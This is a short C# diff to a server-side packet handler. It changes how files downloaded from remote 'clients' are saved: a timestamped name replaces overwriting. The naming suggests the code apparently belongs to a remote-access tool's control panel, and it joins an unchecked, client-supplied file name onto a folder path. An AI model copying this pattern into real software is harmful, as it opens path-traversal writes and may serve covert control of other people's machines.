@@ -150,15 +150,16 @@ namespace Server.Handle_Packet
                                 FormDownloadFile SD = (FormDownloadFile)Application.OpenForms["socketDownload:" + dwid];
                                 if (SD != null)
                                 {
-                                    if (!Directory.Exists(Path.Combine(Application.StartupPath, "ClientsFolder\\" + SD.Text.Replace("socketDownload:", ""))))
+                                    if (!Directory.Exists(SD.DirPath))
                                         return;
-                                    string filename = Path.Combine(Application.StartupPath, "ClientsFolder\\" + SD.Text.Replace("socketDownload:", "") + "\\" + unpack_msgpack.ForcePathObject("Name").AsString);
-                                    if (File.Exists(filename))
+                                    string fileName = unpack_msgpack.ForcePathObject("Name").AsString;
+                                    string dirPath = SD.DirPath;
+                                    if (File.Exists(dirPath + "\\" + fileName))
                                     {
-                                        File.Delete(filename);
-                                        await Task.Delay(500);
+                                        fileName = DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + "_" + fileName;
+                                        await Task.Delay(100);
                                     }
-                                    await Task.Run(() => SaveFileAsync(unpack_msgpack.ForcePathObject("File"), filename));
+                                    await Task.Run(() => SaveFileAsync(unpack_msgpack.ForcePathObject("File"), dirPath + "\\" + fileName));
                                     SD.Close();
                                 }
                             }
